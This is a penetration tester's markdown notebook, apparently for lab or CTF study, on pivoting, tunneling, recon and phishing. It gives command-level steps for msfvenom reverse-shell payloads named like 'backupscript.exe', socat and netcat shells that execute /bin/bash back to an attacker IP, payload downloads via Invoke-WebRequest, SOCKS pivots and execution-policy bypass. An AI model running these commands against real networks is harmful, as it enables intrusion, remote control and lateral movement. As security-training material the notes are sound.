- [Basic Steps](#basic-steps)
  - [Active](#active)
- [PIVOTING](#pivoting)
  - [SSH](#ssh)
  - [Meterpreter Tunneling](#meterpreter-tunneling)
  - [PROXY](#proxy)
  - [SS](#ss)
  - [PLINK.EXE](#plinkexe)
  - [CHISEL](#chisel)
  - [SSHUTTLE](#sshuttle)
  - [SOCAT](#socat)
- [External Tools](#external-tools)
- [Phishing](#phishing)
- [Passive](#passive)
  - [recon-ng](#recon-ng)
  - [Weaponization](#weaponization)
- [Wireshark](#wireshark)

## Basic Steps
- Enumerate
- Find everything that there is outside and inside
  - Number of machines
  - services running
  - Public interface
  - git server
  - public IP
    - arp
  - network connections
- find services running, find cve for these services
- stablish stable connection (pivoting): reverse shell, proxy, ssh, port forwarding, socat, sshuttle
- get ssh key if they are available
- upload/download files
- No dns if web: add to etc/hosts
- Pivot = Pivot host = Proxy = Foothold = Beach Head system = Jump host
- [Diagrams](https://app.diagrams.net/)

```mermaid
---
title: Scenario
---
flowchart TD
subgraph Z[" "]
direction LR
    A[Attacker]:::foo -->|direct access| B(Pivot):::bar ---> C(Target 2):::bar
    A[Attacker] --->|No Access| C(Target 2)
    classDef foo stroke:#f00
    classDef bar stroke:#0f0

end
```

- Tunneling != Pivoting
  - Tunneling = encapsulate
  - pivoting = accessing through segmentation
  - Lateral movement: [Palo Alto](https://www.paloaltonetworks.com/cyberpedia/what-is-lateral-movement) | [Mitre](https://attack.mitre.org/tactics/TA0008/)

- Basic commands
  - netstat
    - -r route
  - ip
    - route

### Active
- interacting
- https://www.rapid7.com/db/
- searchsploit

## PIVOTING
-  from on machine to another
-  tunnelling/proxying: route all traffic (a lot of traffic)
-  port forwarding: create connection (few ports)
-  ProxyChain
- (linux) firewall-cmd --zone=public --add-port PORT/tcp
- (windows) netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT

### SSH
- -o PubkeyAcceptedKeyTypes=ssh-rsa
  - declares SSH key type that client uses
- -o PasswordAuthentication=no
  - no password
- -o PreferredAuthentications=publickey,password,keyboard-interactive
- In the command: ~C = to execute ssh commands
[Port Forwarding](https://notes.benheater.com/books/network-pivoting)

```
# sshd_config
# config for specific user
Match junkuser
    PermitRootLogin no
    PermitTTY no
    PermitUserRC no
    ForceCommand "echo 'This account is for port forwarding only'"
    PasswordAuthentication yes
    PermitEmptyPasswords no
    MaxAuthTries 2   
    AllowAgentForwarding no
    X11Forwarding no
	X11UseLocalhost no
```

- SSH tunneling over socks proxy
  - socks: socks client ----> socks server (attacker) => traffic is routed through socks
  - socks4: no authentication, no UPD
  - socks5: authentication, UDP
  - open port on attacking

- **-L Local Port Forwarding**
  - when: we know which service is listening at which port
  - ssh -L [local_port]:target:[port_on_target] user@$TARGET -fN
  - ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
  - -f = background
  - -N no command execution
- **-D Dynamic Port Forwarding**
  - When: we dont know which services lie on the other side = forward traffic to target network
  - ssh -D SOCKS_LISTENER_PORT user@$TARGET
  - ssh -D 9050 user@$TARGET

- **-R Reverse/Remote Port Forwarding**
  - Send traffic from remote target to attacker
  - ssh Remote from pivot:8080 to attacker:8000
    - ssh -R InternalIPPivot:PivotPORT:0.0.0.0:LocalPort user@$PIVOT -vN

```
# meterpreter shell ==> Pivot:8080 --> Attacker:8000
# Example reverse shell for remote forwarding
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
  - use exploit/multi/handler
    - lhost: 0.0.0.0 - lport 8000
    - payload windows/x64/meterpreter/reverse_https
    - payload windows/x64/meterpreter/reverse_http
    - payload windows/x64/meterpreter_reverse_https

or http or inline

# Upload in windows (invoke-webrequest)
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

- Steps
  - Create msf reverse_shell (on attacker) http|https|stage|stageless
  - upload to pivot (to pivot)
  - start http server (on pivot)
  - download shell (remote target)
  - run ssh -R PivotInternalIp:port:Attacker0.0.0.0:Port User@PivotPublic + Dynamic
   

- Check forwarding
  - netstat -antp
    - -a: show all listening/non-listening sockets
    - -n: numerical address
    - -p: program/pid

### Meterpreter Tunneling
- Steps
1. Upload meterpreter shell on the pivot
2. Create listener (multi handler) on the attacker to listen to 1
3. Execute ping sweep on the internal network
4. Set up MSF sock proxy
5. Create routes to internal subnet found on the pivot (module | inside meterpreter)

- Meterpreter shell for pivot, that return commands to attacker

```
# Start multihandler
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

- Ping sweep to find address of the target

```
# Module
post/multi/gather/ping_sweep RHOSTS=ADD_NETWORK

# Direct on meterpreter
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

# or
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
for i in {1..255}; do (ping -c 1 172.16.5.${i} | grep "bytes from" &); done
- c PACKET
- i time out

# Windows
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

- ICMP blocked
  - TCP scan on ADD_NETWORK

- **Proxy**
```
# Set up proxy of metasploit
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a

jobs: check if it is running

# Route traffic via meterpreter session

use post/multi/manage/autoroute
set SESSION #
set SUBNET TARGET_NET

# or inside the meterpreter session
run autoroute -s 172.16.5.0/23
run autorute -p = list active routes
```

- **Local Port Forwarding**
  - portfwd module
```
portfwd add -l LISTEN -p TARGET_PORT -r Target_IP
portfwd add -l 3300 -p 3389 -r 172.16.5.19

xfreerdp localhost:3300 = xfreerdp target:3389
```

- **Rerverse Port Forwarding**
  - portfwd -R
```
portfwd add -R -l LOCAL_Port -p TARGET_PORT -L $ATTACKER
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

# Set up multi handler to listen
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081 
set LHOST 0.0.0.0 
```

  - Sheell on TARGET would send connection to Pivot:1234 and this send to Attacker:8081

```
# windows payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

### PROXY
- proxychains: route packaet over 9050, force application traffic to go through proxy
    - SOCKS Tunneling = packing command packet and forwarding to remote server
  - proxychains command
    - proxychains nmap -Pn -sT = host-alive NOT in windows (block ICMP), TCP Full
    - proxychains msfconsole@xfreerdp

```
#Proxychain
# /etc/proxychains.conf

socks4 	127.0.0.1 9050
```


- FoxyProxy
  - better for web

- Tools
  - [ssh-audit.py](https://github.com/jtesta/ssh-audit)

- Steps
  - create key pair on the attacking machine
  - transfer private key to victim
  - stablish connection from victim to attacking
  - ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
  - Browser: localhost
  - executing on we habe the shell

- **Reverse Connections**
  - generate ssh key
  - put .pub in authorized: command="echo 'This account can only be used for port forwarding'", no-agent-forwarding,no-x11-forwading,no-pty ssh-rsa key
  - restart ssh
  - transfer private key to target: 
  - port forward: ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
  - reverse proxy: ssh -R 1337[localport] USERNAME@ATTACKING_IP -i KEYFILE -fN
  - In the end: delete key

### SS
- tool to investigate sockets
- -t: tcp sockets
- -u: udp sockets
- -l: listening
- -p: show process
- -n: dont resolve 

### PLINK.EXE
- command line for putty
- cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
- convert key with puttygen: puttygen key -o xxx.ppk

### CHISEL
- set up tunnel proxy / port forward
  
- client / server 
  
- Reverse SOCKS Proxy
  - server: chisel server -p [port] --reverse &
  - client (victim0): ./chisel client [attacker]:8005 R:socks &
    - R = remote, client knows that server antecipate proxy
- 
- Forward SOCK Proxy
  - victim: ./chisel server -p LISTEN_PORT --socks5
  - attacker: ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
  
- Port Forward
  - attacker: ./chisel server -p LISTEN_PORT --reverse &
  - victim to target: ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
  - victim to our machine: ./chisel server -p 1337 --reverse &
  
- Local Port Forward
  - attacker: ./chisel server -p LISTEN_PORT
  - Victim: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
    - Victim: chisel client ATTACKER:PORT R:LOCALPORT:localhost:TargetPORT 

- In the machine with evil-win open firewall port
  - cd w
  - chisel client => attacking
  - chisel server => victim

### SSHUTTLE
- easier to handle
- only linzx
- need ssh access to public interface
- sshuttle -r username@address subnet  
  - -N to guess the subnet
- No password:
  - sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
  - -x exclude compromised server
- Direct access to evil-winrM
  - evil-winrm -u pacoca -p 123456 -i 10.200.101.150
-Reset resolved.service: sudo systemctl restart systemd-resolved.service

### SOCAT
- Bidirectional ==> pipe socket ==> 2 independent network without SSH
  - mestasploit listener <==> socat on target
    - socat will listen on port 8080 and forward everything to attacker 80
```
socat TCP4-LISTEN:8080,fork TCP4:ATTACKER:80
```
  - Steps Reverse shell
    1.  Start socat listener on the pivot
    2.  Create payload for target
    3.  upload payload to the target
    4.  start multi handler on the attacker



```mermaid
---
title: Socat Diagramm Reverse Shell
---
flowchart TD
subgraph Z[" "]
direction LR
    C(Target 1) -->|8080| B(Pivot: Socat listens 8080):::bar -->|80| A[Attacker listens 80]:::foo
    D(Target 2) -->|8080| B(Pivot: Socat listens 8080):::bar 
    E(Target n) -->|8080| B(Pivot: Socat listens 8080):::bar 
    classDef foo stroke:#f00
    classDef bar stroke:#0f0
end
```

```mermaid
---
title: Socat Diagramm Bind Shell
---
flowchart TD
subgraph Z[" "]
direction LR
    A[Attacker]:::foo -->|8080| B(Pivot: Socat listens 8080):::bar -->|8443| C(Target 1 listens 8443) 
    B(Pivot: Socat listens 8080):::bar -->|8443| D(Target 2 listens 8443) 
    B(Pivot: Socat listens 8080):::bar -->|8443| E(Target n listens 8443) 
    classDef foo stroke:#f00
    classDef bar stroke:#0f0
end
```

- Steps
  1. Start bind shell listener
```
socat TCP4-LISTEN:8080,fork TCP4:TARGET:8443
```

- Port Forwarding - Method 1
  - open port on target + redirect to target server = ./socat tcp-l:[port_on_target],fork,reuseaddr tcp:[target_ip]:3306 &

- Method 2 -Quieter - read more about that https://tryhackme.com/room/wreath: 
  - Attacker, opens to ports: socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
  - target: ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
- on target: ./socat tcp-l:8000 tcp:10.50.102.138:443 & => connect target back to us on port 443
- on target: ./nc 127.0.0.1 8000 -e /bin/bash ==> listen to port 8000 
- Port Forwarding [From_Compromised_to_TARGET]: ./socat tcp-l:[port_on_compromised],fork,reuseaddr tcp:[IP_Target]:3306 &

- Encrypted:
  - Create key + Litener + Connect
  - Create certificate: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
  - merge keys: cat shell.key shell.crt > shell.pem
  - listener: socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
  - connect back: socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
 close all:
  - jobs ==> find socats processes 

- Steps:
```
# Create key
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt

# req = certificate
# -x509 = type of certificate
# -newkey rsa:4096 = type of key with size
# -days = valid
# -subj = organization, country
# -nodes = NOT encrypt private key
# -keyout PRIVATE = file with the private key
# -out Certificate = file to write certificate

# PEM = privace enhanced mail = concat .key + .cert
cat thm-reverse.key thm-reverse.crt > thm-reverse.pem.

# Start listener
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT

# Connect
socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash

# Without encryption
  # Listener # socat -d -d TCP-LISTEN:4443,fork STDOUT
  # Victim   # socat TCP:10.20.30.129:4443 EXEC:/bin/bash
```

## External Tools
- enum4linux IP_
- metasploit (smb/enum || ssh/enum)
- gobuster / ffuf
- lienum (linux): 
  - the file must be executed in the target
  - search for readble important files
- executables (SUID): find / -perm -u=s -type f 2>/dev/null 
- How to abuse of each executable: https://gtfobins.github.io/gtfobins/vim/

- PowerSploit (windows)
  - in the target 


## Phishing
- Steps
  - register domain name
  - ssl/tsl certificated
  - email server/account
  - Dns records
  - web server
  
- emlAnalyzer
  - --header
  - -u
  - --text
  - --extract-all

- GoPhish
  - manage phishing campaings

- Droppers
  - poison, downloaded file

## Passive
- whois
- nslookup -type=?? URL SERVER
- dig SERVER URL TYPE
- host
- Google Hacking Database
  - [intitle:"index of" "nginx.log"](https://www.exploit-db.com/google-hacking-database)
  - 
- Google
  - blabla site:
  - filetype:pdf  inurl:www.google.de
  - site:hs-worms.de filetype:docx
  - *intitle:index.of site:*
  - *intitle:login*
  - cache:url
  - https://web.dev/measure/
  - robots.txt

- Maltego
  - graphical

- DNS:
  - shodan.io [check black friday - https://www.shodan.io/]
  - https://viewdns.info/
  - https://threatintelligenceplatform.com/

### recon-ng
- Workspace:
  - workspace create NAME
  - db schmea = check database
- marketplace search MODULE
  - info, install, remove MODULE
- Modules
  - module search/load  
  - options list/set/unset

### Weaponization
- Developing malicious code
- https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development
- VBE
- HTA - Html application
- windows reverse shell
  - get-executionpolicy = for ps1 files
  - set-executionpolicy -Scote Currentuser remotesigned
  - powershell -ex bypass -File name.ps1

## Wireshark
- statistical of
  - protocol
  - ip
  - ports
  - services
- watch out
  - addreses in user
  - suspicious address
  - suspecious port
  - services in user
  - level of traffic
- Check queries
  - dns
  - http